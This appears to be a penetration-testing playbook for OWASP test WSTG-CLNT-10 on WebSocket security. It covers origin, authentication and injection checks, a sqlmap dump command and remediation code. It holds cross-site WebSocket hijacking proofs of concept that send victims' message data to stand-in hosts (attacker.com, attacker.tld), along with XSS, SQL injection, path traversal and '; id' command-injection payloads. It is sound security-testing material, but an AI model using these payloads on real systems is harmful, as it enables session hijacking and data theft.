---
name: wstg-clnt-10
description: "Testing WebSockets"
category: client-side
owasp_id: WSTG-CLNT-10
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-200]
chains_with: [wstg-clnt-06, wstg-clnt-01]
prerequisites: [wstg-conf-03, wstg-conf-06]
severity_boost:
  wstg-clnt-01: "Unvalidated WebSocket messages rendered via an innerHTML-style DOM XSS sink (e.g., chat/notification UI) = a single malicious WS message executes in every connected client that receives it, turning a single-user DOM XSS into a broadcast/worm-like XSS affecting all active sessions — Critical"
  wstg-clnt-06: "No origin validation + an attacker-controlled WebSocket endpoint via resource manipulation = attacker redirects the real-time channel to their own server, intercepting/tampering with all authenticated traffic in transit — Critical"
---

# wstg-clnt-10

## Test ID

WSTG-CLNT-10

## Test Name

Testing WebSockets

## High-Level Description

WebSockets provide full-duplex communication channels over a single TCP connection. Security issues can arise from missing authentication, lack of input validation, cross-site WebSocket hijacking, and insecure data transmission.

---

## What to Check

- [ ] WebSocket authentication
- [ ] Origin validation
- [ ] Input validation
- [ ] Encryption (WSS)
- [ ] Rate limiting
- [ ] Authorization per message

---

## How to Test

### Step 1: Identify WebSocket Endpoints

```javascript
// Browser console
// Check for WebSocket connections
console.log("WebSocket instances:", window.WebSocket)

// Monitor WebSocket creation
const originalWS = window.WebSocket
window.WebSocket = function (...args) {
  console.log("WebSocket created:", args)
  return new originalWS(...args)
}
```

### Step 2: Test WebSocket Security

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

class WebSocketTester:
    def __init__(self, ws_url):
        self.ws_url = ws_url
        self.findings = []

    async def test_origin(self):
        """Test origin validation"""
        print("[*] Testing origin validation...")

        origins = [
            "https://evil.com",
            "null",
            "",
        ]

        for origin in origins:
            try:
                headers = {"Origin": origin}
                async with websockets.connect(
                    self.ws_url,
                    extra_headers=headers
                ) as ws:
                    print(f"[VULN] Accepted origin: {origin}")
                    self.findings.append({
                        "issue": f"Accepts origin: {origin}",
                        "severity": "High"
                    })
            except Exception as e:
                print(f"[OK] Rejected origin: {origin}")

    async def test_no_auth(self):
        """Test if authentication is required"""
        print("\n[*] Testing authentication...")

        try:
            async with websockets.connect(self.ws_url) as ws:
                # Try sending a message without auth
                await ws.send(json.dumps({"action": "get_data"}))
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"[VULN] No authentication required")
                print(f"  Response: {response[:100]}")
                self.findings.append({
                    "issue": "No WebSocket authentication",
                    "severity": "High"
                })
        except Exception as e:
            print(f"[INFO] Connection result: {e}")

    async def test_injection(self):
        """Test for injection vulnerabilities"""
        print("\n[*] Testing injection...")

        payloads = [
            '{"message": "<script>alert(1)</script>"}',
            '{"query": "1 OR 1=1"}',
            '{"path": "../../../etc/passwd"}',
        ]

        try:
            async with websockets.connect(self.ws_url) as ws:
                for payload in payloads:
                    await ws.send(payload)
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        print(f"  Payload: {payload[:30]}")
                        print(f"  Response: {response[:50]}")
                    except:
                        pass
        except Exception as e:
            pass

    async def run_tests(self):
        await self.test_origin()
        await self.test_no_auth()
        await self.test_injection()

# Usage
tester = WebSocketTester("wss://target.com/ws")
asyncio.run(tester.run_tests())
```

### Step 3: Cross-Site WebSocket Hijacking

```html
<!-- Host on attacker.com -->
<script>
  // If origin is not validated, can hijack WebSocket
  const ws = new WebSocket("wss://target.com/ws")

  ws.onopen = function () {
    ws.send(JSON.stringify({ action: "get_sensitive_data" }))
  }

  ws.onmessage = function (event) {
    // Steal data
    fetch("https://attacker.com/log", {
      method: "POST",
      body: event.data,
    })
  }
</script>
```

---

## Tools

| Tool               | Purpose                                            |
| ------------------- | ------------------------------------------------------ |
| **Burp Suite**       | Intercept/repeat/fuzz WebSocket frames (native support)   |
| **websocat**         | CLI WebSocket client for manual message crafting          |
| **wscat**            | Node-based interactive WebSocket client                   |
| **OWASP ZAP**        | WebSocket traffic proxying and fuzzing                    |

---

## Example Commands/Payloads

### Connect and probe with websocat

```bash
websocat wss://{target}/ws
websocat -H "Origin: https://attacker.tld" wss://{target}/ws
```

### wscat manual test

```bash
wscat -c wss://{target}/ws -H "Origin: https://attacker.tld"
> {"action":"get_data"}
```

### Injection payloads to send over an open connection

```json
{"message": "<script>alert(document.domain)</script>"}
{"query": "1 OR 1=1"}
{"path": "../../../etc/passwd"}
{"cmd": "; id"}
```

### Cross-Site WebSocket Hijacking PoC (host on attacker.tld)

```html
<script>
  const ws = new WebSocket("wss://{target}/ws")
  ws.onopen = () => ws.send(JSON.stringify({ action: "get_sensitive_data" }))
  ws.onmessage = (event) =>
    fetch("https://attacker.tld/log", { method: "POST", body: event.data })
</script>
```

### CSWSH PoC using `no-cors` fetch exfil (works even under a strict CSP `connect-src` on attacker.tld)

```html
<script>
  ws = new WebSocket("wss://{target}/messages")
  ws.onopen = () => ws.send("HELLO")
  ws.onmessage = (event) => fetch("https://attacker.tld/?" + event.data, { mode: "no-cors" })
</script>
```

### wsrepl - interactive WebSocket REPL with scriptable auth plugin (Doyensec)

```bash
pip install wsrepl
wsrepl -u wss://{target}/ws -P auth_plugin.py
```

```python
# auth_plugin.py - re-authenticate and reshape each message before send/receive
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage
import json, requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://{target}/uuid").json()["uuid"]
        self.messages = [json.dumps({"auth": "session", "sessionId": token})]

    async def on_message_sent(self, message: WSMessage) -> None:
        message.msg = json.dumps({"type": "message", "data": {"text": message.msg}})
```

### ws-harness.py - fuzz a WebSocket message field through sqlmap/other HTTP tools

```bash
python ws-harness.py -u "wss://{target}/authenticate-user" -m ./message.txt
# message.txt contains the [FUZZ] marker, e.g. {"auth_user":"dGVzda==","auth_pass":"[FUZZ]"}
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --tables --tamper=base64encode --dump
```

---

## Remediation

```python
# Validate origin in WebSocket connection
@websocket.route('/ws')
async def websocket_handler(ws):
    origin = ws.headers.get('Origin')
    allowed_origins = ['https://trusted.com']

    if origin not in allowed_origins:
        await ws.close(code=1008, reason='Invalid origin')
        return

    # Require authentication
    token = ws.headers.get('Authorization')
    if not validate_token(token):
        await ws.close(code=1008, reason='Unauthorized')
        return

    # Process messages with input validation
    async for message in ws:
        data = sanitize_input(json.loads(message))
        # Process...
```

---

## Risk Assessment

| Finding                   | CVSS | Severity |
| ------------------------- | ---- | -------- |
| No origin validation      | 8.1  | High     |
| No authentication         | 7.5  | High     |
| Injection vulnerabilities | 7.5  | High     |
| Unencrypted (WS not WSS)  | 5.3  | Medium   |

---

## CWE Categories

| CWE ID       | Title                                   |
| ------------ | --------------------------------------- |
| **CWE-1385** | Missing Origin Validation in WebSockets |


---

## References

- [OWASP WSTG - Testing WebSockets (WSTG-CLNT-10)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
- [PortSwigger - Testing for WebSockets vulnerabilities](https://portswigger.net/web-security/websockets)
- [OWASP Cross-Site WebSocket Hijacking (CSWSH) reference](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - Web Sockets](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets)

---

## Checklist

```
[ ] WebSocket endpoints identified
[ ] Origin validation tested
[ ] Authentication tested
[ ] WSS encryption checked
[ ] Input validation tested
[ ] Findings documented
```
